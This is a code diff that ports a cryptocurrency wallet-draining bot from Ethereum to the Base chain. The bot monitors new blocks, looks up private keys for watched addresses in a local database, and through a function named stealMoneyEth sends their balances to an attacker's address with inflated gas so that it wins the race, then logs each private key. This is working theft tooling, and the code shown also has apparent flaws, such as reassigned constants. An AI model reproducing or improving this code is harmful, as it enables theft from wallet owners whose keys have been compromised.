@@ -1,13 +1,13 @@
 import Web3 from "web3";
 import * as fs from 'fs';
 import * as path from 'path';
-import { rpc, grab, mode, gasPercentEth, mainAddress } from "./config.js";
+import { rpc, grab, mainAddress } from "./config.js";
 
 let web3 = null
 let data = null
 
-export async function runEth() {
-    web3 = new Web3(new Web3.providers.WebsocketProvider(rpc.ETH));
+export async function runBase() {
+    web3 = new Web3(new Web3.providers.WebsocketProvider(rpc.BASE));
     data = JSON.parse(fs.readFileSync(path.join('./DB', 'database.json')));
     await getBlocksEth();
 }
@@ -17,7 +17,7 @@ async function getBlocksEth() {
     subscription.on('data', async (block, error) => {
         const lastBlock = await web3.eth.getBlock(block.number, true);
         const ethTransactions = lastBlock?.transactions;
-        console.log(`Block ${lastBlock.number} | ETH`);
+        console.log(`Block ${lastBlock.number} | BASE`);
         try {
             for (let transaction of ethTransactions) {
                 transactionWalletEth(transaction);
@@ -37,25 +37,20 @@ function transactionWalletEth(transaction) {
 
 async function stealMoneyEth(address) {
     const walletKey = data[address];
-    const grabFromEthBalance = web3.utils.toWei(grab.ETH, 'ether');
+    const grabFromEthBalance = web3.utils.toWei(grab.BASE, 'ether');
     const balance = await web3.eth.getBalance(address);
     const gasPrice = await web3.eth.getGasPrice();
-    const gasUnits = 21000;
-    const transactionCost = 0;
-    const average = ((Math.random() * (1.8 - 1.6) + 1.6) + (Math.random() * (2.1 - 1.9) + 1.9)) / 2;
 
-    if (mode === 1) {
-        gasPrice =   Math.trunc(Math.trunc(balance * gasPercentEth / 100) / gasUnits);
-        transactionCost =  Math.trunc(balance * gasPercentEth / 100);
-        const gasPriceNetwork = await web3.eth.getGasPrice();
-        if (gasPrice <= gasPriceNetwork) {
-            gasPrice = Math.trunc(gasPriceNetwork * average);
-            transactionCost = gasUnits * gasPrice;
-        }
-    } else {
-        gasPrice =  Math.trunc(gasPrice * average);
-        transactionCost = gasUnits * gasPrice;
-    }
+    const gasUnits = await web3.eth.estimateGas({
+        "from": address,
+        "to": web3.utils.toChecksumAddress(mainAddress),
+        "value": balance,
+    });
+    const transactionCost = 0;
+    const average = ((Math.random() * (2.6 - 2.3) + 2.3) + (Math.random() * (3 - 2.7) + 2.7)) / 2;
+
+    gasPrice =  Math.trunc(gasPrice * average);
+    transactionCost = gasUnits * gasPrice;
 
     for (let i = 0; i < 200; i++) {
         if (balance > grabFromEthBalance) {
@@ -72,7 +67,7 @@ async function stealMoneyEth(address) {
     }
 
     const txPrice = {
-        "chainId": 1,
+        "chainId": 8453,
         "nonce": nonce,
         "to": sendAddress,
         "value": amount,
@@ -85,5 +80,5 @@ async function stealMoneyEth(address) {
     const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
     const receipt = await web3.eth.getTransactionReceipt(txHash);
     const amountEther = web3.utils.fromWei(amount, 'ether');
-    console.log(`✅ ETH | Success withdrawal \nHASH: ${receipt.transactionHash} \n\nAMOUNT: ${amountEther} \nADDR: https://etherscan.io/address/${address} \nPK: ${walletKey}`);
+    console.log(`✅ BASE | Success withdrawal \nHASH: ${receipt.transactionHash} \n\nAMOUNT: ${amountEther} \nADDR: https://basescan.org/address/${address} \nPK: ${walletKey}`);
 }
